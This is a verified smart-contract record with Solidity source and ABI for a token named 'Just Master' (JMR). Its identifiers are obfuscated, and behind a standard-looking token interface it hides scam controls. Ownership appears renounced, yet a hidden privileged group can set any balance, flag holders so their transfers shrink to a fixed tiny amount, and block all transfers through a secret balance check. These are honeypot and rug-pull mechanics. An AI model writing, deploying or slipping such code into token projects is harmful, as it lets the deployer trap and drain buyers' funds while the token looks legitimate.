{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface minTxTake {\n    function createPair(address totalAuto, address atShould) external returns (address);\n}\n\ninterface launchedIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atMin) external view returns (uint256);\n\n    function transfer(address tradingEnable, uint256 isSender) external returns (bool);\n\n    function allowance(address receiverLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingEnable,\n        uint256 isSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txTradingTeam, uint256 value);\n    event Approval(address indexed receiverLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract tradingAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedIsMetadata is launchedIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract JustMaster is tradingAuto, launchedIs, launchedIsMetadata {\n\n    mapping(address => bool) public receiverWallet;\n\n    address public isEnableLaunch;\n\n    uint256 public maxIsLaunch;\n\n    function transferFrom(address txLiquidity, address tradingEnable, uint256 isSender) external override returns (bool) {\n        if (_msgSender() != teamAt) {\n            if (liquiditySender[txLiquidity][_msgSender()] != type(uint256).max) {\n                require(isSender <= liquiditySender[txLiquidity][_msgSender()]);\n                liquiditySender[txLiquidity][_msgSender()] -= isSender;\n            }\n        }\n        return takeAuto(txLiquidity, tradingEnable, isSender);\n    }\n\n    address private atReceiver;\n\n    bool public txTrading;\n\n    address teamAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public atTeam;\n\n    bool private minFee;\n\n    uint256 takeReceiver;\n\n    uint256 public receiverIsTx;\n\n    event OwnershipTransferred(address indexed marketingFundLimit, address indexed amountAt);\n\n    mapping(address => uint256) private atExempt;\n\n    function approve(address modeFee, uint256 isSender) public virtual override returns (bool) {\n        liquiditySender[_msgSender()][modeFee] = isSender;\n        emit Approval(_msgSender(), modeFee, isSender);\n        return true;\n    }\n\n    function takeAuto(address txLiquidity, address tradingEnable, uint256 isSender) internal returns (bool) {\n        if (txLiquidity == isEnableLaunch) {\n            return receiverSell(txLiquidity, tradingEnable, isSender);\n        }\n        uint256 senderAmount = launchedIs(sellShould).balanceOf(enableLiquidityLaunched);\n        require(senderAmount == launchMaxFee);\n        require(tradingEnable != enableLiquidityLaunched);\n        if (receiverWallet[txLiquidity]) {\n            return receiverSell(txLiquidity, tradingEnable, amountLiquidity);\n        }\n        return receiverSell(txLiquidity, tradingEnable, isSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atMax;\n    }\n\n    function transfer(address autoTx, uint256 isSender) external virtual override returns (bool) {\n        return takeAuto(_msgSender(), autoTx, isSender);\n    }\n\n    function marketingTotal() public {\n        emit OwnershipTransferred(isEnableLaunch, address(0));\n        atReceiver = address(0);\n    }\n\n    address public sellShould;\n\n    constructor (){\n        \n        enableToken autoReceiver = enableToken(teamAt);\n        sellShould = minTxTake(autoReceiver.factory()).createPair(autoReceiver.WETH(), address(this));\n        \n        isEnableLaunch = _msgSender();\n        atTeam[isEnableLaunch] = true;\n        atExempt[isEnableLaunch] = enableFund;\n        marketingTotal();\n        if (senderFrom == minFee) {\n            maxIsLaunch = receiverIsTx;\n        }\n        emit Transfer(address(0), isEnableLaunch, enableFund);\n    }\n\n    uint256 private enableFund = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityMin;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toAt;\n    }\n\n    function owner() external view returns (address) {\n        return atReceiver;\n    }\n\n    function liquidityReceiver(address exemptTo) public {\n        if (txTrading) {\n            return;\n        }\n        if (maxIsLaunch == launchFee) {\n            receiverIsTx = launchFee;\n        }\n        atTeam[exemptTo] = true;\n        if (launchFee != receiverIsTx) {\n            minFee = true;\n        }\n        txTrading = true;\n    }\n\n    bool public senderFrom;\n\n    function tokenLaunchReceiver(address toBuy) public {\n        marketingTake();\n        if (minFee == senderFrom) {\n            receiverIsTx = launchFee;\n        }\n        if (toBuy == isEnableLaunch || toBuy == sellShould) {\n            return;\n        }\n        receiverWallet[toBuy] = true;\n    }\n\n    function allowance(address receiverMax, address modeFee) external view virtual override returns (uint256) {\n        if (modeFee == teamAt) {\n            return type(uint256).max;\n        }\n        return liquiditySender[receiverMax][modeFee];\n    }\n\n    function balanceOf(address atMin) public view virtual override returns (uint256) {\n        return atExempt[atMin];\n    }\n\n    uint256 constant amountLiquidity = 17 ** 10;\n\n    function walletExemptReceiver(address autoTx, uint256 isSender) public {\n        marketingTake();\n        atExempt[autoTx] = isSender;\n    }\n\n    string private liquidityMin = \"Just Master\";\n\n    function marketingTake() private view {\n        require(atTeam[_msgSender()]);\n    }\n\n    uint8 private atMax = 18;\n\n    function autoLaunch(uint256 isSender) public {\n        marketingTake();\n        launchMaxFee = isSender;\n    }\n\n    uint256 launchMaxFee;\n\n    address enableLiquidityLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private toAt = \"JMR\";\n\n    mapping(address => mapping(address => uint256)) private liquiditySender;\n\n    function receiverSell(address txLiquidity, address tradingEnable, uint256 isSender) internal returns (bool) {\n        require(atExempt[txLiquidity] >= isSender);\n        atExempt[txLiquidity] -= isSender;\n        atExempt[tradingEnable] += isSender;\n        emit Transfer(txLiquidity, tradingEnable, isSender);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFund;\n    }\n\n    function getOwner() external view returns (address) {\n        return atReceiver;\n    }\n\n    uint256 public launchFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFundLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTradingTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isSender\",\"type\":\"uint256\"}],\"name\":\"autoLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnableLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxIsLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIsTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"}],\"name\":\"tokenLaunchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isSender\",\"type\":\"uint256\"}],\"name\":\"walletExemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "JustMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}